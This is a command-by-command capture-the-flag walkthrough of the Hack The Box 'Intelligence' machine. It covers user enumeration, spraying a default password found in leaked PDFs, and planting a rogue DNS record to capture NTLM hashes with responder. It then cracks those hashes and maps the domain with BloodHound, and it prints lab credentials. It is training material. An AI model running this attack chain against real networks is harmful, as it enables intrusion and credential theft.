```
nmap -sS -sC -sV -T5 -Pn 10.10.10.248
```
![image](https://github.com/regarmulia/HTB/assets/33616880/6413486e-f42a-43a5-b969-237d18b6e161)

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -u http://10.10.10.248/FUZZ -e .aspx,.php,.txt,.html,.sh
```
![image](https://github.com/regarmulia/HTB/assets/33616880/96991ceb-dfba-48ae-a7ad-6399ba07a2ed)

```
wget http://10.10.10.248/documents/2020-01-01-upload.pdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/bdc6e7f4-18d2-448d-95b8-1531c66d373e)

```
exiftool 2020-01-01-upload.pdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/44a19195-37c8-4deb-b3ed-b2c660206718)

```
curl http://10.10.10.248/documents/2020-01-01-upload.pdf --output 2020-01-01-upload.pdf
```
![image](https://github.com/regarmulia/HTB/assets/33616880/b57f601a-2f11-4db5-ac20-830bd9527e7f)

```
wget https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb users
```
![image](https://github.com/regarmulia/HTB/assets/33616880/4efd407f-9ea1-4de4-9387-ba3ea918ac6d)

```
#!/usr/bin/env python3

import datetime
import requests


t = datetime.datetime(2020, 1, 1)  
end = datetime.datetime(2021, 7, 4) 

while True:
    url = t.strftime("http://intelligence.htb/documents/%Y-%m-%d-upload.pdf")  
    resp = requests.get(url)
    if resp.status_code == 200:
        print(url)
    t = t + datetime.timedelta(days=1)
    if t >= end:
        break
```
```
python3 findpdfs.py
```
![image](https://github.com/regarmulia/HTB/assets/33616880/0a43ff18-7da3-413d-8e83-ef4b8c33c978)

![image](https://github.com/regarmulia/HTB/assets/33616880/5cef87be-c746-4a4f-87d4-f5d4d5f95f63)

```
wget -i pdfsurl
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5def43cf-a8a4-43a7-b66b-9ba62c4fb63d)

```
exiftool *upload.pdf | grep Creator | sort –u
exiftool *upload.pdf | grep Creator | awk -F': ' '{print $2}' | sort -u
```
![image](https://github.com/regarmulia/HTB/assets/33616880/c455f320-d1a8-4227-8fb2-c7a237733da9)

![image](https://github.com/regarmulia/HTB/assets/33616880/447f7d52-ef55-4f5b-9ef1-97e4df35eca7)

```
for f in *pdf; do pdftotext $f; done
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9ed0481f-90bf-425a-b359-7ec3b702c948)

```
head -n1 *txt
NewIntelligenceCorpUser9876
```
![image](https://github.com/regarmulia/HTB/assets/33616880/7470bba3-1f65-4360-90db-2d353f91365c)

![image](https://github.com/regarmulia/HTB/assets/33616880/1274008a-d8b3-475d-acb1-af86b0b1f8b4)

```
cat *txt > all.txt
nano all.txt; ctrl+w password
```
![image](https://github.com/regarmulia/HTB/assets/33616880/20edb4ef-02e1-4a33-9a2f-9386d399c602)

```
crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876
```
![image](https://github.com/regarmulia/HTB/assets/33616880/af9cb0b4-8e06-42ea-96e3-366f913af48a)

```
smbclient -L \\\\10.10.10.248\\ -U intelligence.htb/Tiffany.Molina
smbclient \\\\10.10.10.248\\Users -U intelligence.htb/Tiffany.Molina
```
![image](https://github.com/regarmulia/HTB/assets/33616880/3b60eb9f-aaee-4da9-8639-382181585649)

![image](https://github.com/regarmulia/HTB/assets/33616880/972a6c20-fa6e-4693-9782-b904c13b384c)

```
smbclient \\\\10.10.10.248\\IT -U intelligence.htb/Tiffany.Molina
```
![image](https://github.com/regarmulia/HTB/assets/33616880/d81005aa-6f13-4698-941d-57d3de9a0095)

![image](https://github.com/regarmulia/HTB/assets/33616880/c6526640-fcd1-4dd6-9486-20c982b8e738)

```
https://github.com/dirkjanm/krbrelayx
./dnstool.py -u 'intelligence\Tiffany.Molina' -p NewIntelligenceCorpUser9876 10.10.10.248 -a add -r web1 -d 10.10.14.20 -t A
responder -I tun0
```
![image](https://github.com/regarmulia/HTB/assets/33616880/5fc68265-dab2-4817-972b-3c52bc647e63)

![image](https://github.com/regarmulia/HTB/assets/33616880/0915f164-fa0e-4265-b707-cd6e4c2ba008)

```
john hash -w=/usr/share/wordlists/rockyou.txt
Ted.Graves | Mr.Teddy
```
![image](https://github.com/regarmulia/HTB/assets/33616880/9652e79f-8d7d-4049-b812-64cf935c500c)

![image](https://github.com/regarmulia/HTB/assets/33616880/95066406-d2c7-472f-a0dd-0dd7827689cb)

```
sudo apt install bloodhound
neo4j console
```
![image](https://github.com/regarmulia/HTB/assets/33616880/49cb9f67-4bbf-4794-9cbd-2087b07b71e8)

![image](https://github.com/regarmulia/HTB/assets/33616880/eb604014-04eb-40b0-9659-e440e903fade)

```
git clone https://github.com/fox-it/BloodHound.py.git
cd BloodHound.py
python3 setup.py install
python3 bloodhound.py -d intelligence.htb -u Ted.Graves -p Mr.Teddy -ns 10.10.10.248 -c All
```
![image](https://github.com/regarmulia/HTB/assets/33616880/1e1237c4-76e0-4a83-be86-647b7fe2415e)
